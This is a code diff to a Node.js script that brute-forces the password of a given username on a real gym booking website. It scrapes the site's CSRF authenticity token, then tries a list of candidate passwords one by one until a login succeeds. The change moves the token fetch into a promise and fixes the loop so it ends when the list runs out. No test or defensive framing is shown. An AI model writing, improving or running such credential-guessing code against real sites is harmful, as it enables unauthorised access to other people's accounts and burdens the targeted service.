@@ -17,26 +17,42 @@ function init(username) {
 		return;
 	}
 
-	request({
-		url: 'http://www.crossfitcopenhagen.dk/booking',
-		jar: cookieJar,
-	}, function(error, response, body) {
-		if (error) {
-			printWarning('Could not initialize ', error);
-			return;
-		}
-
-		var $ = cheerio.load(body);
-		var authenticityToken = $('input[name="authenticity_token"]').val();
-
-		var passwords = getPossiblePasswords();
-		asyncReduce(passwords, function(password) {
-			printNormal(password);
-			return attemptLogin(username, password, authenticityToken, cookieJar);
-		}).then(function(password) {
-			printSuccess('Correct password: ', password);
+	getAuthenticityToken(cookieJar)
+		.catch(function(error) {
+			printWarning('Could not get token', error);
+		})
+		.then(function(authenticityToken) {
+			var passwords = getPossiblePasswords();
+			return asyncReduce(passwords, function(password) {
+				printNormal(password);
+				return attemptLogin(username, password, authenticityToken, cookieJar);
+			});
+		})
+		.then(function(password) {
+			if (password) {
+				printSuccess('Correct password: ', password);
+			} else {
+				printWarning('Password could not be found');
+			}
 		})
 		.done();
+}
+
+function getAuthenticityToken(cookieJar) {
+	return Q.Promise(function(resolve, reject) {
+		request({
+			url: 'http://www.crossfitcopenhagen.dk/booking',
+			jar: cookieJar,
+		}, function(error, response, body) {
+			if (error) {
+				reject(error);
+				return;
+			}
+
+			var $ = cheerio.load(body);
+			var authenticityToken = $('input[name="authenticity_token"]').val();
+			resolve(authenticityToken);
+		});
 	});
 }
 
@@ -69,7 +85,9 @@ function asyncReduce(items, fn) {
 	function next(index) {
 		var item = items[index];
 		return fn(item).then(function(isSuccess) {
-			return isSuccess ? item : next(++index);
+			index++;
+			var hasRemaining = items.length > index;
+			return isSuccess ? item : hasRemaining ? next(index) : null;
 		});
 	}
 
